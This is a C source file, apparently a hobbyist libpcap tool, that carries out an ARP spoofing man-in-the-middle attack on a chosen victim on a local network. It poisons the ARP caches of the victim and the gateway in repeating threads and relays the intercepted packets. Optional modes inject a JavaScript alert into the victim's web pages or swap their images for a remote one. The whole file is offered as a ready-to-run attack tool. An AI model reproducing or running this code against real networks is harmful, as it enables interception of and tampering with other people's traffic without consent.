#include "HUAJI_head.h"
#include <pthread.h>

u_char TARGET_MAC[6]; //victim's mac
u_char ATTACKER_MAC[6]; //attacker's mac
u_char GATEWAY_MAC[6]; //gateway's mac
u_char TARGET_IP[4]; //victim's ip
u_char GATEWAY_IP[4] = {192,168,1,1}; //gateway's ip
int choose; //mode choose

/* about more thread */
struct arg1 {
    pcap_t *handle;
    u_char *packet;
    int size;
} tar_arg, gate_arg;

struct arg2 {
    pcap_t *handle;
    u_char *packet;
    struct pcap_pkthdr *pkthdr;
    int size;
} forward_arg;

void *retval;
pthread_t thread1, thread2, thread3;
int ret_thread1, ret_thread2, ret_thread3;

/* send packet to gateway */
void *startG(void *arg) {
    struct arg1 *real_arg = (struct arg1 *)arg;
    while (1) {
        send_packet(real_arg->handle, real_arg->packet, real_arg->size);
        sleep(10);
    }
    pthread_exit(NULL);
}

/* send packet to victim */
void *startV(void *arg) {
    struct arg1 *real_arg = (struct arg1 *)arg;
    while (1) {
        send_packet(real_arg->handle, real_arg->packet, real_arg->size);
        sleep(10);
    }
    pthread_exit(NULL);
}

/* forward packet */
void *startF(void *arg) {

    /* receive parameter */
    struct arg2 *real_arg =(struct arg2 *)arg;
    u_char *packet = (u_char *)malloc(real_arg->size * sizeof(char));
    memcpy(packet, real_arg->packet, real_arg->size);
    ethernet_header *pEther = (ethernet_header *)packet;
    ip_header *pIpv4 = (ip_header *)pEther->data;
    tcp_header *pTcp = (tcp_header *)pIpv4->data;

    /* forward packet straightly */
    if (!strncmp(pEther->SRC_mac, TARGET_MAC, 6) && !strncmp(pEther->DST_mac, ATTACKER_MAC, 6)) {
        memcpy(pEther->DST_mac, GATEWAY_MAC, 6);
        send_packet(real_arg->handle, packet, real_arg->size);
    }

    /* modify html */
    else if (!strncmp(pEther->SRC_mac, GATEWAY_MAC, 6) && !strncmp(pIpv4->dest_ip, TARGET_IP, 4)) {
        memcpy(pEther->DST_mac, TARGET_MAC, 6);
        if (choose == 2)
            if (ntohs(pEther->eth_type) == EPT_IPv4 && pIpv4->type_of_service == PROTOCOL_TCP)
                str_replace((char *)pTcp->data, "<head>", "<head><script type=\"text/javascript\">alert('big brother is watching at you');</script>");
        if (choose == 3)
            if (ntohs(pEther->eth_type) == EPT_IPv4 && pIpv4->type_of_service == PROTOCOL_TCP)
                str_replace((char *)pTcp->data, "img src=", "img src=\"https://raw.githubusercontent.com/zxc479773533/HUA-JI-YOU/master/HUAJI.jpg\"");
        send_packet(real_arg->handle, packet, real_arg->size);
    }
}

/* get gatway's mac */
void getgateway(u_char *user, const struct pcap_pkthdr *hp, const u_char *packet) {
    ethernet_header *pEther = (ethernet_header *)packet;
    loading();
    printf("The gateway's MAC address is : ");
    print_mac(pEther->SRC_mac);
    memcpy(GATEWAY_MAC ,pEther->SRC_mac, 6);
    printf("\n");
}

int main(int argc, char const *argv[]) {
    
    /* definations */
    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE] = {0};
    u_int mask;
    u_int net_addr;
    char *net;
    char *real_mask;
    struct in_addr addr_net;
    pcap_t *handle;
    u_char ARPpacket[42];
    u_char ARPpacket_forvictim[42];
    u_char ARPpacket_forgateway[42];
    struct bpf_program filter;
    char filter_app[100];
    int counter = 0;
    
    /* get and start device */
    dev = getdev(dev, errbuf);
    if (pcap_lookupnet(dev, &net_addr, &mask, errbuf) == -1) {
        printf("%s\n", errbuf); //打印错误信息
        exit(1); //结束程序
    }
    addr_net.s_addr = net_addr;
    net = inet_ntoa(addr_net);
    printf("Opening device\n");
    handle = pcap_open_live(dev, 65536, 1, 0, errbuf);
    if (!handle) {
        printf("%s\n", errbuf);
        printf("If the Problem is \"you don't have permission\", please run this program as root!\n");
        exit(1);
    }
    loading();

    /* get your mac */
    printf("Getting your MAC\n");
    int sockfd;
    static struct ifreq req;
    sockfd = socket(PF_INET, SOCK_DGRAM, 0);
    strcpy(req.ifr_name, dev);
    ioctl(sockfd, SIOCGIFHWADDR, &req);
    loading();
    printf("Your MAC is: ");
    print_mac((u_char *)req.ifr_hwaddr.sa_data);
    memcpy(ATTACKER_MAC, (u_char *)req.ifr_hwaddr.sa_data, 6);
    printf("\n");

    /* enter ip */
    printf("Please enter your victim's IP (format: 192.168.1.0)\n");
    scanf("%hhd.%hhd.%hhd.%hhd", &TARGET_IP[0], &TARGET_IP[1], &TARGET_IP[2], &TARGET_IP[3]);

    /* get attack resource */
    printf("\nGetting your victim's MAC......\n");
    char ip[20], ping[40] = "ping -c 3 >ping.txt ", arp[20] = "arp -e >arp.txt ", data[300];
    sprintf(ip,"%d.%d.%d.%d", TARGET_IP[0], TARGET_IP[1], TARGET_IP[2], TARGET_IP[3]);
    strcat(ping, ip), system(ping);
    strcat(arp, ip), system(arp);
    FILE* fp = fopen("arp.txt", "r");
    fgets(data, 300, fp);
    fgets(data, 300, fp);
    char *p = strstr(data, "ether");
    if (p == NULL) {
        printf("Not found!\n");
        exit(1);
    }
    get_mac(TARGET_MAC, p + 8);
    printf("His MAC is: ");
    print_mac(TARGET_MAC);
    printf("\n");


    /* get gateway's mac */
    printf("Geting gateway's MAC\n");
    strcpy(filter_app, "src 192.168.1.1");
    pcap_compile(handle, &filter, filter_app, 0, *net);
    pcap_setfilter(handle, &filter);
    pcap_loop(handle, 1, getgateway, NULL);

    /* cheating gateway */
    ARP_packet_build(ARPpacket_forgateway, sizeof(ARPpacket_forgateway), GATEWAY_MAC, GATEWAY_IP, ATTACKER_MAC, TARGET_IP, 2);
    printf("Cheating gateway preparing\n");
    gate_arg.handle = handle;
    gate_arg.packet = ARPpacket_forgateway;
    gate_arg.size = sizeof(ARPpacket_forgateway);
    loading();

    /* cheating victim */
    ARP_packet_build(ARPpacket, sizeof(ARPpacket), TARGET_MAC, TARGET_IP, ATTACKER_MAC, GATEWAY_IP, 2);
    printf("Attack source preparing\n");
    tar_arg.handle = handle;
    tar_arg.packet = ARPpacket;
    tar_arg.size = sizeof(ARPpacket);
    loading();

    /* Attack */
    printf("Attack!\n\n");
    ret_thread1 = pthread_create(&thread1, NULL, (void *)startG, (void *)&gate_arg);
    ret_thread2 = pthread_create(&thread2, NULL, (void *)startV, (void *)&tar_arg);

    /* next step */
    struct pcap_pkthdr *pkt_header;
    u_char *pkt_data;
    printf("Please wait\n");
    sleep(3);
    printf("Now your victim's network has been broken !\n");
    printf("If you want to do something interesting, you can enter a number to choose mode.\n");
    printf("Do nothing to keep the condition.\n");
    printf("\t1: Just \"repair\" his network\n");
    printf("\t2: Add a window which says \"Big Brother is watching you!\" when he open a web page.\n");
    printf("\t3: Change all the picture in his web page to HUAJI.\n");
    scanf(" %d", &choose);

    /* four modes */
    char my_mac[20];
    sprintf(my_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
    ATTACKER_MAC[0], ATTACKER_MAC[1], ATTACKER_MAC[2], ATTACKER_MAC[3], ATTACKER_MAC[4], ATTACKER_MAC[5]);
    strcpy(filter_app, "not ether src ");
    strcat(filter_app, my_mac);
    pcap_compile(handle, &filter, filter_app, 0, *net);
    pcap_setfilter(handle, &filter);
    while (1) {
        if (pcap_next_ex(handle, &pkt_header, &pkt_data) > 0) {
            pthread_t new_thread;
            forward_arg.handle = handle;
            forward_arg.packet = pkt_data;
            forward_arg.pkthdr = pkt_header;
            forward_arg.size = pkt_header->caplen;
            pthread_create(&new_thread, NULL, (void *)startF, (void *)&forward_arg);
            while(pkt_data);
        }
    }

    /* before end */
    pthread_join(thread2,NULL);
    pthread_join(thread3,NULL);
    pcap_close(handle);

    return 0;
}